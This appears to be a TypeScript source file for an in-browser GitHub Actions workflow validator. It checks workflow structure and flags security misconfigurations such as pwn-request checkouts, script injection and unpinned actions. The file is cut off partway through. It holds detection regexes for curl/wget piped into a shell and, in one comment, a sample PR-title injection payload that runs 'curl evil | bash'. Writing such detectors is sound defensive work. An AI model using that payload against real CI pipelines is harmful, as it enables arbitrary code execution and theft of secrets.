/**
 * GitHub Actions Validator — a CLIENT-SIDE, dependency-free checker that parses
 * a GitHub Actions workflow YAML and reports structural errors plus SECURITY
 * misconfigurations.
 *
 * ┌──────────────────────────────────────────────────────────────────────────┐
 * │  WHAT THIS IS                                                              │
 * │                                                                            │
 * │  A pragmatic, in-browser linter focused on the security mistakes that      │
 * │  actually leak repository write access or secrets:                         │
 * │                                                                            │
 * │    • pull_request_target + checkout of the PR head  → runs UNTRUSTED code  │
 * │      with a privileged token (the classic "pwn request").                  │
 * │    • script injection — untrusted ${{ github.event.* }} expanded straight  │
 * │      into a shell `run:` block.                                            │
 * │    • unpinned third-party actions — `uses: owner/repo@v4` / `@main` can be │
 * │      moved to malicious code; pin to a full 40-char commit SHA.            │
 * │    • over-broad or implicit permissions — `write-all` or no top-level      │
 * │      `permissions:` (the default token is broader than most jobs need).    │
 * │    • `curl … | bash` / `wget … | sh` — piping the network into a shell.    │
 * │    • secrets used in pull_request-triggered workflows (forks).             │
 * │                                                                            │
 * │  It parses YAML for structure, then runs a RAW LINE SCAN to attach honest  │
 * │  line numbers to each finding (GitHub expressions and shell snippets are   │
 * │  easier to locate textually than via the parsed tree). It never throws:    │
 * │  a YAML parse failure returns { ok:false, error } with zero findings.      │
 * └──────────────────────────────────────────────────────────────────────────┘
 */

// js-yaml v4 ships ESM but no bundled type declarations, and @types/js-yaml is
// not a project dependency. Declare the tiny surface we use so the project
// type-checks under strict mode without adding a dependency.
declare module 'js-yaml' {
  export function load(input: string, options?: unknown): unknown;
  const _default: { load: typeof load };
  export default _default;
}

import yaml from 'js-yaml';
import type { Finding, Severity, ValidateResult } from './types';

/* ────────────────────────────────────────────────────────────────────────── *
 *  Parsed-document shapes (loose — user input is validated as we read it).
 * ────────────────────────────────────────────────────────────────────────── */

interface WorkflowStep {
  uses?: unknown;
  run?: unknown;
  with?: Record<string, unknown>;
  name?: unknown;
  id?: unknown;
}

interface WorkflowJob {
  'runs-on'?: unknown;
  uses?: unknown;
  steps?: unknown;
  permissions?: unknown;
  needs?: unknown;
}

/**
 * A job paired with the source lines we resolved for it. Built ONCE (see
 * `indexJobs`) and shared by the structural and security passes so every
 * per-job / per-step finding can point at its own line instead of collapsing
 * onto the job header.
 */
interface JobEntry {
  id: string;
  raw: unknown;
  /** 1-based line of the `<job-id>:` key, when locatable. */
  line?: number;
  /** 1-based line of each `- ` sequence item under this job's `steps:`. */
  stepLines: number[];
}

interface Workflow {
  on?: unknown;
  jobs?: unknown;
  permissions?: unknown;
  name?: unknown;
}

/* ────────────────────────────────────────────────────────────────────────── *
 *  Small helpers.
 * ────────────────────────────────────────────────────────────────────────── */

function isRecord(v: unknown): v is Record<string, unknown> {
  return typeof v === 'object' && v !== null && !Array.isArray(v);
}

/** Coerce a YAML scalar that may be a string into a trimmed string (else ''). */
function asString(v: unknown): string {
  return typeof v === 'string' ? v : '';
}

/**
 * Best-effort line-referenced description of a js-yaml parse error. Mirrors the
 * AlertLint engine so error messaging is consistent across tools.
 */
function describeYamlError(e: unknown): string {
  if (e && typeof e === 'object') {
    const err = e as {
      reason?: string;
      mark?: { line?: number; column?: number };
      message?: string;
    };
    if (err.reason && err.mark && typeof err.mark.line === 'number') {
      return `${err.reason} (line ${err.mark.line + 1}, column ${(err.mark.column ?? 0) + 1}).`;
    }
    if (err.message) return err.message;
  }
  return String(e);
}

/**
 * Find the 1-based line number of the first raw line matching `test`, optionally
 * starting the search at `fromLine` (1-based). Returns undefined if not found.
 * Used to attach honest line numbers to findings located by text scan.
 */
function findLine(
  lines: string[],
  test: (line: string) => boolean,
  fromLine = 1,
): number | undefined {
  for (let i = Math.max(0, fromLine - 1); i < lines.length; i++) {
    if (test(lines[i])) return i + 1;
  }
  return undefined;
}

function escapeRegExp(s: string): string {
  return s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

/** Width of a line's leading whitespace (YAML forbids tabs for indentation). */
function indentOf(line: string): number {
  return line.length - line.replace(/^[ \t]+/, '').length;
}

/** Blank lines and whole-line comments carry no structure — skip them. */
function isSkippableLine(line: string): boolean {
  return line.trim() === '' || /^\s*#/.test(line);
}

/**
 * 1-based line of a DIRECT child key of the job declared at `jobLine`.
 * Scoped by indentation so a `needs:`/`steps:` nested deeper (inside a `with:`
 * block, say) can never be mistaken for the job's own key.
 */
function findJobChildLine(
  lines: string[],
  jobLine: number | undefined,
  key: string,
): number | undefined {
  if (jobLine === undefined || jobLine < 1 || jobLine > lines.length) return undefined;
  const jobIndent = indentOf(lines[jobLine - 1]);
  const re = new RegExp(`^\\s*${escapeRegExp(key)}\\s*:`);
  let bodyIndent = -1;
  for (let i = jobLine; i < lines.length; i++) {
    const l = lines[i];
    if (isSkippableLine(l)) continue;
    const ind = indentOf(l);
    if (ind <= jobIndent) break; // dedent → left this job's block
    if (bodyIndent === -1) bodyIndent = ind;
    if (ind === bodyIndent && re.test(l)) return i + 1;
  }
  return undefined;
}

/**
 * Resolve the 1-based source line of EACH `- ` sequence item under a job's
 * `steps:` key. YAML allows the items to sit at the same indent as `steps:` or
 * deeper, so the first item fixes the item indent and siblings must match it.
 * Returns [] when the block cannot be located — callers fall back to the job line.
 */
function findStepLines(lines: string[], jobLine: number | undefined): number[] {
  const stepsLine = findJobChildLine(lines, jobLine, 'steps');
  if (stepsLine === undefined) return [];
  const stepsIndent = indentOf(lines[stepsLine - 1]);

  const out: number[] = [];
  let itemIndent = -1;
  for (let i = stepsLine; i < lines.length; i++) {
    const l = lines[i];
    if (isSkippableLine(l)) continue;
    const ind = indentOf(l);
    if (ind < stepsIndent) break; // dedent out of the job entirely
    const isItem = /^\s*-(\s|$)/.test(l);
    if (itemIndent === -1) {
      if (!isItem) break; // `steps:` is not a sequence — nothing to index
      itemIndent = ind;
    }
    if (ind < itemIndent) break; // sibling key of `steps:`
    if (ind === itemIndent) {
      if (!isItem) break; // a sibling key at the item indent ends the list
      out.push(i + 1);
    }
    // Deeper lines belong to the step already recorded.
  }
  return out;
}

/**
 * Pair every job with its source lines, ONCE. Job keys are searched in document
 * order from a moving cursor (falling back to a full scan below `jobs:`) so two
 * jobs never resolve to the same line.
 */
function indexJobs(wf: Workflow, lines: string[]): JobEntry[] {
  if (!isRecord(wf.jobs)) return [];
  const jobsLine = findLine(lines, (l) => /^\s*jobs\s*:/.test(l)) ?? 1;
  let cursor = jobsLine + 1;

  return Object.entries(wf.jobs as Record<string, unknown>).map(([id, raw]) => {
    const test = (l: string) => new RegExp(`^\\s+${escapeRegExp(id)}\\s*:`).test(l);
    const line = findLine(lines, test, cursor) ?? findLine(lines, test, jobsLine + 1);
    if (line !== undefined) cursor = line + 1;
    return { id, raw, line, stepLines: findStepLines(lines, line) };
  });
}

/* ────────────────────────────────────────────────────────────────────────── *
 *  Security-detection regexes (documented at their use sites).
 * ────────────────────────────────────────────────────────────────────────── */

/**
 * Untrusted GitHub-context expressions an attacker controls via a PR/issue/comment.
 * These are the classic script-injection vectors: their *values* are attacker
 * text, so interpolating them into a shell line lets the attacker run commands.
 * (We intentionally do NOT flag safe contexts like github.sha or github.ref_name
 * derived server-side, nor github.token.)
 */
const UNTRUSTED_CONTEXT_RE =
  /\$\{\{\s*(?:github\.event\.(?:issue|pull_request|comment|review|discussion|head_commit)?\.?(?:title|body|head_ref|label\.name|user\.login|description|message)|github\.head_ref|github\.event\.pull_request\.head\.ref|github\.event\.pull_request\.head\.label|github\.event\.commits|github\.event\.pages)\b[^}]*\}\}/i;

/** Any `${{ ... }}` GitHub expression, used to scope the injection scan to run blocks. */
const ANY_EXPRESSION_RE = /\$\{\{[^}]*\}\}/;

/** `uses: owner/repo@ref` — captures owner, repo path and the ref after `@`. */
const USES_REF_RE = /^([\w.-]+)\/([\w./-]+)@(.+)$/;

/** A full 40-char (or longer, e.g. SHA-256) hex commit SHA — the safe pin target. */
const FULL_SHA_RE = /^[0-9a-f]{40,}$/i;

/** `curl … | bash` / `wget … | sh` (and `| sudo bash`, `|sh`, etc.). */
const PIPE_TO_SHELL_RE =
  /(?:curl|wget)\b[^\n|]*\|\s*(?:sudo\s+)?(?:ba|z|k|da)?sh\b/i;

/* ────────────────────────────────────────────────────────────────────────── *
 *  Public API.
 * ────────────────────────────────────────────────────────────────────────── */

/**
 * Validate a GitHub Actions workflow YAML. NEVER throws: a parse failure returns
 * { ok:false, error }, an empty document returns a single structural error, and
 * any unexpected internal error is caught and surfaced as a generic error.
 */
export function validate(yamlText: string): ValidateResult {
  const empty = { errors: 0, warnings: 0, infos: 0 };

  // 0. Defensive: the contract is `string`, but never throw even if a caller
  // passes null/undefined/non-string at runtime.
  if (typeof yamlText !== 'string') {
    return {
      ok: false,
      error: 'Paste a GitHub Actions workflow YAML to validate.',
      findings: [],
      summary: { ...empty },
    };
  }

  // Empty input is not a parse error — guide the user instead.
  if (yamlText.trim() === '') {
    return {
      ok: false,
      error: 'Paste a GitHub Actions workflow YAML to validate.',
      findings: [],
      summary: { ...empty },
    };
  }

  // 1. Parse YAML. Any failure is a line-referenced, fatal error.
  let doc: unknown;
  try {
    doc = yaml.load(yamlText);
  } catch (e) {
    return {
      ok: false,
      error: `Could not parse YAML: ${describeYamlError(e)}`,
      findings: [],
      summary: { ...empty },
    };
  }

  if (!isRecord(doc)) {
    return {
      ok: false,
      error:
        'The document is not a YAML mapping. A workflow must be a top-level object with `on:` and `jobs:` keys.',
      findings: [],
      summary: { ...empty },
    };
  }

  const lines = yamlText.split(/\r?\n/);
  const findings: Finding[] = [];
  const add = (f: Finding) => findings.push(f);

  try {
    const wf = doc as Workflow;
    // Resolve job/step source lines once and share them across both passes.
    const jobs = indexJobs(wf, lines);
    runStructuralChecks(wf, lines, jobs, add);
    runSecurityChecks(wf, lines, jobs, add);
  } catch (e) {
    // The contract says never throw. If a heuristic trips on unexpected input,
    // degrade gracefully to an info note rather than losing the whole run.
    add({
      id: 'internal-analysis-incomplete',
      severity: 'info',
      title: 'Some checks could not complete.',
      detail: `An internal check stopped early on this input (${String(e)}). Structural results above are still valid.`,
    });
  }

  return finalize(findings);
}

/* ────────────────────────────────────────────────────────────────────────── *
 *  Structural checks — is this a well-formed workflow at all?
 * ────────────────────────────────────────────────────────────────────────── */

/**
 * Every event GitHub can trigger a workflow on. A name outside this list is a
 * typo (`pusssh`) or an invented event, and the workflow will simply never run
 * — GitHub reports it only as a workflow-file error after you push.
 * Source: GitHub docs, "Events that trigger workflows".
 */
const KNOWN_EVENTS = new Set<string>([
  'branch_protection_rule',
  'check_run',
  'check_suite',
  'create',
  'delete',
  'deployment',
  'deployment_protection_rule',
  'deployment_status',
  'discussion',
  'discussion_comment',
  'fork',
  'gollum',
  'issue_comment',
  'issues',
  'label',
  'merge_group',
  'milestone',
  'page_build',
  'project',
  'project_card',
  'project_column',
  'public',
  'pull_request',
  'pull_request_review',
  'pull_request_review_comment',
  'pull_request_target',
  'push',
  'registry_package',
  'release',
  'repository_dispatch',
  'schedule',
  'status',
  'watch',
  'workflow_call',
  'workflow_dispatch',
  'workflow_run',
]);

function runStructuralChecks(
  wf: Workflow,
  lines: string[],
  jobs: JobEntry[],
  add: (f: Finding) => void,
): void {
  // A workflow MUST declare a trigger. js-yaml (YAML 1.2 core schema) keeps the
  // key `on` as the string `"on"`, so `wf.on` is the trigger value directly; an
  // empty `on:` parses to null, which we treat as a missing trigger.
  const hasOn = wf.on !== undefined && wf.on !== null;
  if (!hasOn) {
    add({
      id: 'missing-on',
      severity: 'error',
      title: 'Workflow has no `on:` trigger.',
      detail:
        'Every workflow must declare at least one event under `on:` (for example push, pull_request, or workflow_dispatch). Without it GitHub will never run the workflow.',
      line: findLine(lines, (l) => /^\s*on\s*:/.test(l)),
      remediation: 'Add a top-level `on:` block, e.g. `on: [push]` or `on: { pull_request: {} }`.',
    });
  } else {
    // Every trigger name must be a real GitHub event; a typo silently means the
    // workflow never runs.
    for (const event of collectTriggers(wf.on)) {
      if (KNOWN_EVENTS.has(event)) continue;
      add({
        id: 'unknown-trigger',
        severity: 'error',
        title: `Unknown workflow trigger “${event}”.`,
        detail:
          'GitHub only accepts a fixed set of event names under `on:`. An unrecognised name (often a typo, like `pusssh` for `push`) makes the workflow file invalid, so it never runs.',
        line:
          findLine(lines, (l) => new RegExp(`\\b${escapeRegExp(event)}\\b`).test(l)) ??
          findLine(lines, (l) => /^\s*on\s*:/.test(l)),
        remediation:
          'Use a documented event name such as `push`, `pull_request`, `workflow_dispatch`, `schedule`, or `workflow_call`.',
      });
    }
  }

  // A workflow MUST define jobs, and `jobs:` must be a mapping of job-id → job.
  if (wf.jobs === undefined || wf.jobs === null) {
    add({
      id: 'missing-jobs',
      severity: 'error',
      title: 'Workflow has no `jobs:`.',
      detail: 'A workflow must define at least one job under a top-level `jobs:` mapping.',
      line: findLine(lines, (l) => /^\s*jobs\s*:/.test(l)),
      remediation: 'Add a `jobs:` block containing one or more job definitions.',
    });
    return; // nothing more to check without jobs
  }

  if (!isRecord(wf.jobs)) {
    add({
      id: 'jobs-not-mapping',
      severity: 'error',
      title: '`jobs:` must be a mapping of job IDs to job definitions.',
      detail: 'Found `jobs:` but it is not an object. Each key under `jobs:` is a job ID.',
      line: findLine(lines, (l) => /^\s*jobs\s*:/.test(l)),
      remediation: 'Indent each job under `jobs:` as `<job-id>:` with its own `runs-on`/`steps`.',
    });
    return;
  }

  if (jobs.length === 0) {
    add({
      id: 'jobs-empty',
      severity: 'error',
      title: '`jobs:` is empty.',
      detail: 'A workflow must define at least one job.',
      line: findLine(lines, (l) => /^\s*jobs\s*:/.test(l)),
      remediation: 'Add a job under `jobs:`.',
    });
    return;
  }

  const jobIds = new Set(jobs.map((j) => j.id));
  for (const job of jobs) {
    checkJob(job, lines, jobIds, add);
  }
}

function checkJob(
  entry: JobEntry,
  lines: string[],
  jobIds: Set<string>,
  add: (f: Finding) => void,
): void {
  const { id: jobId, raw: rawJob, line: jobLine, stepLines } = entry;

  if (!isRecord(rawJob)) {
    add({
      id: 'job-not-mapping',
      severity: 'error',
      title: `Job “${jobId}” is not a mapping.`,
      detail: 'Each job must be an object with at least `runs-on` (or `uses:` for a reusable workflow).',
      line: jobLine,
      remediation: 'Define the job as `<job-id>:` with `runs-on:` and `steps:` (or `uses:`).',
    });
    return;
  }

  const job = rawJob as WorkflowJob;

  // A job is valid if it either runs on a runner OR calls a reusable workflow.
  const hasRunsOn = job['runs-on'] !== undefined && job['runs-on'] !== null;
  const isReusable = typeof job.uses === 'string' && job.uses.trim() !== '';
  if (!hasRunsOn && !isReusable) {
    add({
      id: 'job-missing-runs-on',
      severity: 'error',
      title: `Job “${jobId}” has no \`runs-on\` or \`uses\`.`,
      detail:
        'A job must specify the runner it executes on (`runs-on:`) or reference a reusable workflow (`uses:`).',
      line: jobLine,
      remediation: 'Add `runs-on: ubuntu-latest` (or another runner), or `uses:` a reusable workflow.',
    });
  }

  // Every `needs:` entry must name a job that actually exists in this file —
  // GitHub rejects the whole workflow otherwise (and a rename is the usual cause).
  for (const dep of toStringList(job.needs)) {
    if (jobIds.has(dep)) continue;
    add({
      id: 'job-needs-unknown',
      severity: 'error',
      title: `Job “${jobId}” needs “${dep}”, which is not a job in this workflow.`,
      detail:
        'Every value under `needs:` must be the ID of another job in the same workflow file. A stale or misspelled ID makes the workflow invalid, so no job runs.',
      line: findJobChildLine(lines, jobLine, 'needs') ?? jobLine,
      remediation: `Point \`needs:\` at an existing job ID${
        jobIds.size ? ` (one of: ${[...jobIds].join(', ')})` : ''
      }, or remove the dependency.`,
    });
  }

  // Reusable-workflow jobs do not contain steps; only validate steps otherwise.
  if (isReusable) return;

  if (job.steps === undefined || job.steps === null) {
    add({
      id: 'job-missing-steps',
      severity: 'warning',
      title: `Job “${jobId}” has no \`steps\`.`,
      detail: 'A runner-based job with no steps does nothing. Did you forget to add steps?',
      line: jobLine,
      remediation: 'Add a `steps:` list, even if just a single `run:` or `uses:` step.',
    });
    return;
  }

  if (!Array.isArray(job.steps)) {
    add({
      id: 'steps-not-list',
      severity: 'error',
      title: `\`steps\` for job “${jobId}” must be a list.`,
      detail: 'Steps are a YAML sequence; each item is a step with `uses:` or `run:`.',
      line: jobLine,
      remediation: 'Make `steps:` a list of `- uses: …` / `- run: …` items.',
    });
    return;
  }

  job.steps.forEach((rawStep, idx) => {
    // Point each step's findings at THAT step's own line; fall back to the job
    // header only when the raw source could not be indexed.
    const stepLine = stepLines[idx] ?? jobLine;

    if (!isRecord(rawStep)) {
      add({
        id: 'step-not-mapping',
        severity: 'error',
        title: `Step ${idx + 1} in job “${jobId}” is not a mapping.`,
        detail: 'Each step must be an object containing either `uses:` or `run:`.',
        line: stepLine,
        remediation: 'Write each step as `- uses: …` or `- run: …`.',
      });
      return;
    }
    const step = rawStep as WorkflowStep;
    const usesDeclared = Object.prototype.hasOwnProperty.call(step, 'uses');
    const hasUses = typeof step.uses === 'string' && step.uses.trim() !== '';
    const hasRun = typeof step.run === 'string' && step.run.trim() !== '';

    if (hasUses && hasRun) {
      // GitHub rejects the workflow rather than guessing which one you meant.
      add({
        id: 'step-uses-and-run',
        severity: 'error',
        title: `Step ${idx + 1} in job “${jobId}” declares both \`uses\` and \`run\`.`,
        detail:
          'A step either invokes an action (`uses:`) or executes a shell command (`run:`) — never both. GitHub rejects a step that sets both keys.',
        line: stepLine,
        remediation:
          'Split it into two steps: one with `uses:` for the action and one with `run:` for the command.',
      });
    } else if (usesDeclared && !hasUses) {
      add({
        id: 'step-empty-uses',
        severity: 'error',
        title: `Step ${idx + 1} in job “${jobId}” has an empty \`uses\`.`,
        detail:
          'The step declares `uses:` but gives no action reference, so there is nothing to run.',
        line: stepLine,
        remediation:
          'Give `uses:` an action reference (`owner/repo@<sha>`, `./local-action`, or `docker://image`), or delete the key.',
      });
    } else if (!hasUses && !hasRun) {
      add({
        id: 'step-missing-action',
        severity: 'error',
        title: `Step ${idx + 1} in job “${jobId}” has neither \`uses\` nor \`run\`.`,
        detail: 'A step must either run a shell command (`run:`) or invoke an action (`uses:`).',
        line: stepLine,
        remediation: 'Add a `run:` command or a `uses:` action reference to the step.',
      });
    }
  });
}

/** Normalise a scalar-or-sequence YAML value (e.g. `needs:`) into a string list. */
function toStringList(v: unknown): string[] {
  if (typeof v === 'string') return v.trim() === '' ? [] : [v.trim()];
  if (Array.isArray(v)) {
    return v.filter((x): x is string => typeof x === 'string' && x.trim() !== '').map((x) => x.trim());
  }
  return [];
}

/* ────────────────────────────────────────────────────────────────────────── *
 *  Security checks — the differentiator.
 * ────────────────────────────────────────────────────────────────────────── */

function runSecurityChecks(
  wf: Workflow,
  lines: string[],
  jobs: JobEntry[],
  add: (f: Finding) => void,
): void {
  const triggers = collectTriggers(wf.on);
  const usesPullRequestTarget = triggers.has('pull_request_target');
  const usesPullRequest = triggers.has('pull_request');

  checkPwnRequest(usesPullRequestTarget, jobs, lines, add);
  checkScriptInjection(wf, lines, add);
  checkUnpinnedActions(lines, add);
  checkPermissions(wf, lines, add);
  checkPipeToShell(lines, add);
  checkSecretsInPullRequest(usesPullRequest || usesPullRequestTarget, lines, add);
}

/**
 * Collect the set of trigger event names from `on:`, which may be a string,
 * a list of strings, or a mapping of event → config.
 */
function collectTriggers(on: unknown): Set<string> {
  const set = new Set<string>();
  if (typeof on === 'string') {
    set.add(on);
  } else if (Array.isArray(on)) {
    for (const e of on) if (typeof e === 'string') set.add(e);
  } else if (isRecord(on)) {
    for (const k of Object.keys(on)) set.add(k);
  }
  return set;
}

/* (a) ─ pull_request_target + checkout of PR head → arbitrary code execution ─
 *
 * `pull_request_target` runs with a READ/WRITE token AND access to secrets,
 * evaluated against the BASE repo — but if the workflow then checks out the PR
 * head (`ref: ${{ github.event.pull_request.head.sha }}` / `head.ref`, or
 * `ref: refs/pull/.../merge`), it executes attacker-controlled code with that
 * privileged token. This is the canonical "pwn request" supply-chain hole.
 */
/** A checkout `ref:` that resolves to attacker-controlled PR head code. */
const UNTRUSTED_CHECKOUT_REF_RE =
  /\$\{\{\s*github\.(?:event\.pull_request\.head\.(?:sha|ref|label)|event\.pull_request\.merge_commit_sha|head_ref)\s*\}\}/i;

function isUntrustedCheckoutRef(ref: string): boolean {
  return UNTRUSTED_CHECKOUT_REF_RE.test(ref) || /refs\/pull\//i.test(ref);
}

function checkPwnRequest(
  usesPullRequestTarget: boolean,
  jobs: JobEntry[],
  lines: string[],
  add: (f: Finding) => void,
): void {
  if (!usesPullRequestTarget) return;

  // IMPORTANT: this rule reads the PARSED tree only. A raw text scan cannot
  // tell a real `ref:` from the same words inside a `#` comment (or a docstring
  // in a `run:` block), and used to raise a false ERROR on safe workflows that
  // merely *document* the pattern they are avoiding.
  let hasCheckout = false;
  let flagged = false;

  for (const { raw, line: jobLine, stepLines } of jobs) {
    if (!isRecord(raw)) continue;
    const steps = (raw as WorkflowJob).steps;
    if (!Array.isArray(steps)) continue;

    steps.forEach((rawStep, idx) => {
      if (!isRecord(rawStep)) return;
      const step = rawStep as WorkflowStep;
      // Only `actions/checkout` can place PR code on the runner's disk.
      if (!/^actions\/checkout@/i.test(asString(step.uses).trim())) return;
      hasCheckout = true;

      // Inspect ONLY this step's own `with.ref`; the default (no `ref:`) checks
      // out the BASE repo under pull_request_target, which is the safe case.
      const ref = isRecord(step.with) ? asString(step.with.ref).trim() : '';
      if (ref === '' || !isUntrustedCheckoutRef(ref)) return;

      flagged = true;
      add({
        id: 'pull-request-target-checkout',
        severity: 'error',
        title: 'pull_request_target checks out untrusted PR code.',
        detail:
          'This workflow triggers on `pull_request_target` (privileged token + secrets) and checks out the pull request head. Any fork contributor can run arbitrary code with your repository’s write token — the classic “pwn request” vulnerability.',
        line: stepLines[idx] ?? jobLine,
        remediation:
          'Do not check out PR head in `pull_request_target`. Use `pull_request` for untrusted code, or split into a privileged job (no checkout of PR code) and an unprivileged build job, and never expose secrets to checked-out PR code.',
      });
    });
  }

  if (!flagged && hasCheckout) {
    // Checkout present but we could not prove it targets the PR head — still
    // worth a warning, because the default checkout under pull_request_target
    // is the base ref (safer) but the combination is easy to make unsafe.
    add({
      id: 'pull-request-target-checkout-review',
      severity: 'warning',
      title: 'pull_request_target uses checkout — review carefully.',
      detail:
        'A `pull_request_target` workflow runs with a privileged token and secrets. Combining it with `actions/checkout` is risky: if any step builds, installs, or runs code from the PR, a fork can execute code with your write token.',
      line: findLine(lines, (l) => /pull_request_target/i.test(l)),
      remediation:
        'Confirm you never execute PR-provided code (build scripts, dependencies, makefiles) in this workflow, or move untrusted work to a separate `pull_request` workflow.',
    });
  }
}

/* (b) ─ Script injection via untrusted ${{ github.event.* }} in `run:` ────────
 *
 * GitHub expands `${{ … }}` BEFORE the shell runs. If an attacker-controlled
 * value (PR title/body, branch name, comment, …) is interpolated directly into
 * a `run:` block, the attacker can break out of the intended command and run
 * their own — e.g. a PR title of `"; curl evil | bash; #` becomes shell code.
 * We scan each `run:` block's source lines for these untrusted contexts.
 */
function checkScriptInjection(
  wf: Workflow,
  lines: string[],
  add: (f: Finding) => void,
): void {
  // Only scan lines that belong to a `run:` shell block. Interpolating an
  // untrusted context into a `with:`/`env:` INPUT (e.g. `ref: ${{ github.head_ref }}`)
  // is NOT shell injection, so scanning the whole document would false-positive.
  const RUN_RE = /^(\s*)(?:-\s*)?run:\s*(.*)$/;
  const seenLines = new Set<number>();

  const flag = (ln: number, text: string) => {
    if (seenLines.has(ln)) return;
    if (ANY_EXPRESSION_RE.test(text) && UNTRUSTED_CONTEXT_RE.test(text)) {
      seenLines.add(ln);
      add({
        id: 'script-injection',
        severity: 'warning',
        title: 'Untrusted input interpolated into a shell command.',
        detail:
          'An attacker-controlled GitHub context (such as a PR title, body, or branch name) is expanded directly inside a `run:` step. Because `${{ … }}` is substituted before the shell executes, a malicious value can inject and run arbitrary commands.',
        line: ln,
        remediation:
          'Pass the value through an environment variable instead of inline interpolation, e.g. set `env: { TITLE: ${{ github.event.pull_request.title }} }` and reference `"$TITLE"` in the script (quoted).',
      });
    }
  };

  for (let i = 0; i < lines.length; i++) {
    const m = lines[i].match(RUN_RE);
    if (!m) continue;
    const indent = m[1].length;
    const inline = m[2].trim();
    if (/^[|>]/.test(inline)) {
      // Block scalar (`run: |` / `run: >`): scan the more-indented body lines.
      for (let j = i + 1; j < lines.length; j++) {
        if (lines[j].trim() === '') continue;
        const lineIndent = lines[j].length - lines[j].replace(/^\s+/, '').length;
        if (lineIndent <= indent) break; // dedent → block ended
        flag(j + 1, lines[j]);
      }
    } else {
      // Inline `run:` command on the same line.
      flag(i + 1, lines[i]);
    }
  }
}

/* (c) ─ Unpinned third-party actions (`uses: owner/repo@vN` / `@branch`) ──────
 *
 * A tag or branch ref is MUTABLE: the owner (or an attacker who compromises the
 * action repo) can repoint `v4`/`main` at malicious code that then runs with
 * your workflow’s token. Pinning to a full commit SHA freezes the exact code.
 * First-party `actions/*` and `github/*` are lower risk (info, not warning) but
 * the same advice applies.
 */
function checkUnpinnedActions(lines: string[], add: (f: Finding) => void): void {
  for (let i = 0; i < lines.length; i++) {
    const m = lines[i].match(/uses:\s*['"]?([^'"#\s]+)['"]?/i);
    if (!m) continue;
    const ref = m[1].trim();

    // Skip local actions (`./path`) and Docker refs (`docker://…`) — different
    // pinning rules; SHA pinning does not apply.
    if (ref.startsWith('./') || ref.startsWith('docker://')) continue;

    const refMatch = ref.match(USES_REF_RE);
    if (!refMatch) continue; // not an owner/repo@ref form (e.g. reusable local)

    const owner = refMatch[1];
    const after = refMatch[3].trim();
    // Some uses include a subpath: owner/repo/path@ref — `owner` is still index 1.
    if (FULL_SHA_RE.test(after)) continue; // already pinned to a commit SHA ✓

    const firstParty = /^(actions|github)$/i.test(owner);
    add({
      id: firstParty ? 'unpinned-first-party-action' : 'unpinned-action',
      severity: firstParty ? 'info' : 'warning',
      title: firstParty
        ? `First-party action “${ref}” is pinned to a tag, not a SHA.`
        : `Third-party action “${ref}” is not pinned to a commit SHA.`,
      detail: firstParty
        ? 'This action is maintained by GitHub, so the risk is lower, but tags and branches are still mutable. Pinning to a full commit SHA guarantees the exact code you reviewed runs every time.'
        : 'This action is referenced by a mutable tag or branch (e.g. `@v4` or `@main`). The maintainer — or anyone who compromises the action — can repoint it to malicious code that runs with your workflow’s token and secrets.',
      line: i + 1,
      remediation: `Pin to a full 40-character commit SHA, e.g. \`uses: ${owner}/…@<sha>\`, and add a comment with the human-readable version. Tools like Dependabot can keep the SHA up to date.`,
    });
  }
}

/* (d) ─ Over-broad or implicit permissions ───────────────────────────────────
 *
 * `permissions: write-all` (or `contents: write` everywhere) grants the job
 * token far more than it needs; a compromised step or action then has broad
 * write access. With NO top-level `permissions:`, the token defaults to the
 * repository/org setting — historically read/write — which is broader than the
 * least-privilege default of read-only. Recommend declaring least privilege.
 */
function checkPermissions(
  wf: Workflow,
  lines: string[],
  add: (f: Finding) => void,
): void {
  const topPerms = wf.permissions;

  const isWriteAll = (p: unknown): boolean =>
    p === 'write-all' || (typeof p === 'string' && p.trim().toLowerCase() === 'write-all');

  if (isWriteAll(topPerms)) {
    add({
      id: 'permissions-write-all',
      severity: 'warning',
      title: 'Top-level `permissions: write-all` is over-broad.',
      detail:
        '`write-all` grants the GITHUB_TOKEN write access to every scope (contents, packages, deployments, …). A single compromised step or action then inherits all of it.',
      line: findLine(lines, (l) => /permissions:\s*write-all/i.test(l)),
      remediation:
        'Declare only the scopes you need, e.g. `permissions: { contents: read }`, and elevate per-job where a specific write is required.',
    });
  } else if (topPerms === undefined || topPerms === null) {
    // No top-level permissions — check whether jobs declare their own; if none
    // do, the default token scope applies and we recommend an explicit default.
    let anyJobDeclares = false;
    if (isRecord(wf.jobs)) {
      for (const job of Object.values(wf.jobs as Record<string, unknown>)) {
        if (isRecord(job) && (job as WorkflowJob).permissions !== undefined) {
          anyJobDeclares = true;
        }
        // A job that sets write-all is also worth flagging.
        if (isRecord(job) && isWriteAll((job as WorkflowJob).permissions)) {
          anyJobDeclares = true;
        }
      }
    }
    if (!anyJobDeclares) {
      add({
        id: 'permissions-missing',
        severity: 'warning',
        title: 'No top-level `permissions:` — token defaults are broad.',
        detail:
          'Without an explicit `permissions:` block, the GITHUB_TOKEN inherits the repository/organization default, which can be read/write. Declaring least privilege limits the blast radius if a step is compromised.',
        line: 1,
        remediation:
          'Add a top-level `permissions: { contents: read }` (or `permissions: read-all`) and grant additional scopes only to the jobs that need them.',
      });
    }
  }

  // Also flag any job that opts into write-all even when the top level is fine.
  if (isRecord(wf.jobs)) {
    for (const [jobId, job] of Object.entries(wf.jobs as Record<string, unknown>)) {
      if (isRecord(job) && isWriteAll((job as WorkflowJob).permissions)) {
        add({
          id: 'job-permissions-write-all',
          severity: 'warning',
          title: `Job “${jobId}” requests \`permissions: write-all\`.`,
          detail:
            'This job grants its token write access to every scope. Scope it down to only what the job needs.',
          line: findLine(lines, (l) => /permissions:\s*write-all/i.test(l)),
          remediation: 'Replace `write-all` with the specific scopes the job requires.',
        });
      }
    }
  }
}

/* (e) ─ `curl … | bash` / `wget … | sh` in run steps ─────────────────────────
 *
 * Piping a network download straight into a shell runs whatever the server
 * returns — there is no review, no checksum, and a compromised or MITM’d host
 * executes arbitrary code in your runner with its token and secrets.
 */
function checkPipeToShell(lines: string[], add: (f: Finding) => void): void {
  for (let i = 0; i < lines.length; i++) {
    if (PIPE_TO_SHELL_RE.test(lines[i])) {
      add({
        id: 'pipe-to-shell',
        severity: 'warning',
        title: 'Piping a network download directly into a shell.',
        detail:
          'A `curl … | bash` / `wget … | sh` pattern executes whatever the remote server returns, with no integrity check. A compromised host, hijacked domain, or MITM lets an attacker run arbitrary code on the runner.',
        line: i + 1,
        remediation:
          'Download to a file, verify a checksum/signature, then execute — or install via a pinned, trusted action or package manager instead.',
      });
